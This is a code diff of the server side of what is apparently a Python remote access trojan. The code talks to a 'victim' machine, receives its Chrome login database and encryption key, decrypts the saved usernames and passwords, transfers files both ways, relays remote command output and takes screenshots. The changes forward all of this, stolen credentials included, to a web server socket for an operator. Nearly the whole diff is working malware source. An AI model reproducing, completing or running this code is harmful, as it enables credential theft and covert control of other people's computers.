@@ -80,7 +80,7 @@ class Server:
     def decode_chrome_passwords(self):
         # get the AES key
         key = self.get_encryption_key()
-
+        content = ""
         # connect to the database
         db = sqlite3.connect("ChromeData")
         cursor = db.cursor()
@@ -100,24 +100,31 @@ class Server:
                 print(f"Action URL: {action_url}")
                 print(f"Username: {username}")
                 print(f"Password: {password}")
+                content += f"Origin URL: {origin_url} + \n + Action URL: {action_url} + \n + Username: {username} + \n + Password: {password} + \n"
             else:
                 continue
             if date_created != 86400000000 and date_created:
                 print(f"Creation date: {str(self.get_chrome_datetime(date_created))}")
+                content += f"Creation date: {str(self.get_chrome_datetime(date_created))} + \n"
             if date_last_used != 86400000000 and date_last_used:
                 print(f"Last Used: {str(self.get_chrome_datetime(date_last_used))}")
+                content += f"Last Used: {str(self.get_chrome_datetime(date_last_used))} + \n"
             print("=" * 50)
+            content += "=" * 50 + "\n"
         cursor.close()
         db.close()
+        return content
 
     def receive_file_from_client(self, path_to_save):
 
         # Take from the victim file
         if path_to_save == "":
-            path_to_save = file_path = input("Where do you want save the file?\n")
+            self.web_server_socket.send("Where do you want save the file?".encode())
+            path_to_save = file_path = self.web_server_socket.recv(1024).decode()
 
         with open(path_to_save, 'wb')as f:
             print('Open File')
+            self.web_server_socket.send("Open File".encode())
             while True:
                 data = self.server_socket.recv(1024)
                 if not data or len(data) < 1024:
@@ -128,10 +135,12 @@ class Server:
                     break
                 f.write(data)
         print('done')
+        self.web_server_socket.send('Done!'.encode())
 
     def send_file_to_client(self, data):
         # Send to the victim files
-        victim_path = input('Where do you want save the file\n')
+        self.web_server_socket.send("Whete do you want to save the file".encode())
+        victim_path = self.web_server_socket.recv(1024).decode()  # input('Where do you want save the file\n')
         self.server_socket.sendall(victim_path.encode('utf-8'))
         f = open(data, 'rb')
         while True:
@@ -141,6 +150,7 @@ class Server:
             else:
                 f.close()
                 break
+        self.web_server_socket.send("The file was sent to the victim successfully!".encode())
 
     def get_command_from_server(self):
         while True:
@@ -161,6 +171,8 @@ class Server:
         elif command.startswith("cmd"):
             data = self.server_socket.recv(2048)
             print(data.decode('utf-8', 'ignore'))
+            self.web_server_socket.send(data)
+
 
 
         elif command.startswith("get files"):
@@ -187,7 +199,7 @@ class Server:
         elif command.startswith("get chrome passwords"):
             self.receive_file_from_client("ChromeKey")
             self.receive_file_from_client("ChromeData")
-            self.decode_chrome_passwords()
+            self.web_server_socket.send(self.decode_chrome_passwords().encode())
 
         elif command.startswith('take screenshot '):
             self.receive_file_from_client("")
@@ -205,6 +217,8 @@ class Server:
         elif command == 'q':
             print("quitting")
             self.server_socket.close()
+            self.web_server_socket.close()
+            self.web_server_socket.send("Quitting!".encode())
             quit(1)
 
         else:
@@ -212,8 +226,6 @@ class Server:
             print(data)
             self.web_server_socket.send(data.encode())
             return
-
-        self.web_server_socket.send(data)
 
     # self.server_socket.close()
 
